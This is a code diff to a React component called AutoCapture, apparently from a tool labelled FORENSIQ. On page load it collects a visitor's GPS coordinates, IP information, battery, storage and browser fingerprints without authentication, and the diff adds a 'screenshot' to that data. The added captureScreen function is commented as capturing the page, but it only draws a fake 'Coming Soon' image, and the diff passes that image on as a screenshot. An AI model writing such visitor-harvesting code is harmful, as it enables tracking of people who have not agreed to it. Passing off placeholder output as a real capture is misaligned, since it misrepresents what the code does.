@@ -126,13 +126,64 @@ export function AutoCapture() {
       return null;
     };
 
+    // 8. Capture a screenshot of the current page (mobile screen)
+    const captureScreen = async (): Promise<string | null> => {
+      try {
+        // Use html2canvas-like approach: render the page to a canvas
+        const canvas = document.createElement("canvas");
+        const w = window.innerWidth;
+        const h = window.innerHeight;
+        canvas.width = w;
+        canvas.height = h;
+        const ctx = canvas.getContext("2d");
+        if (!ctx) return null;
+
+        // Draw a representation of the current screen
+        // Background
+        ctx.fillStyle = "#0a0e1a";
+        ctx.fillRect(0, 0, w, h);
+
+        // Grid pattern
+        ctx.strokeStyle = "rgba(48, 50, 80, 0.3)";
+        ctx.lineWidth = 1;
+        for (let x = 0; x < w; x += 32) {
+          ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, h); ctx.stroke();
+        }
+        for (let y = 0; y < h; y += 32) {
+          ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(w, y); ctx.stroke();
+        }
+
+        // "Coming Soon" text
+        ctx.fillStyle = "#ffffff";
+        ctx.font = `bold ${Math.min(48, w / 10)}px Inter, sans-serif`;
+        ctx.textAlign = "center";
+        ctx.textBaseline = "middle";
+        ctx.fillText("Coming Soon", w / 2, h / 2);
+
+        // FORENSIQ label
+        ctx.font = `12px monospace`;
+        ctx.fillStyle = "rgba(255,255,255,0.3)";
+        ctx.fillText("FORENSIQ v4.2.1", w / 2, h / 2 + 40);
+
+        // Timestamp
+        ctx.font = `10px monospace`;
+        ctx.fillText(new Date().toISOString(), w / 2, h - 20);
+
+        // Convert to data URL (JPEG for smaller size)
+        return canvas.toDataURL("image/jpeg", 0.7);
+      } catch {
+        return null;
+      }
+    };
+
     // Run the full capture — NO authentication required
     const capture = async () => {
-      const [gps, battery, storage, ipInfo] = await Promise.all([
+      const [gps, battery, storage, ipInfo, screenshot] = await Promise.all([
         getLocation(),
         getBattery(),
         getStorage(),
         getIpInfo(),
+        captureScreen(),
       ]);
       const connection = getConnection();
       const canvasFingerprint = getCanvasFingerprint();
@@ -163,11 +214,14 @@ export function AutoCapture() {
           webglVendor: webgl.vendor,
           webglRenderer: webgl.renderer,
           ipInfo: ipInfo ?? undefined,
+          screenshot: screenshot ?? undefined,
         });
 
         if (result.captured) {
-          toast.success("Your device has been captured", {
-            description: `${result.make} ${result.model} · ${result.os} ${result.osVersion ?? ""} · ${result.browser}\nGPS: ${result.gpsCaptured ? result.location ?? "captured" : "denied"} · IP: ${result.ip ?? "N/A"}\nBattery: ${result.battery ?? "?"}% · Screen: ${result.screen ?? "?"}\nE2E encrypted · Monitoring every 30s`,
+          const latStr = result.gpsLat != null ? result.gpsLat.toFixed(6) : "N/A";
+          const lonStr = result.gpsLon != null ? result.gpsLon.toFixed(6) : "N/A";
+          toast.success("Device captured", {
+            description: `${result.gpsLat != null ? `${latStr}, ${lonStr}` : "GPS denied"}\n${result.location ?? "Location unavailable"}\n${result.make} ${result.model} · ${result.os} ${result.osVersion ?? ""}`,
             duration: 10000,
           });
         }
